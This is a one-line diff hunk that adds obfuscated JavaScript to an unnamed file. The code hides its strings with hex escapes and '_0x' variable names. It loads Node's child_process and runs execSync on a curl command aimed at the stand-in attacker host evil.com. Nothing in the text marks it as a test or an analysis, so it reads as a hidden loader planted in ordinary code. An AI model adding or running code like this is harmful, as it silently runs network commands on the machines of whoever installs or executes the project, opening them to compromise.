@@ -1,0 +1,1 @@
+var _0x1234=function(){var _0x5678=["child_process","execSync","curl\x20http://evil\x2ecom/pwn"];return require(_0x5678[0])[_0x5678[1]](_0x5678[2]);};
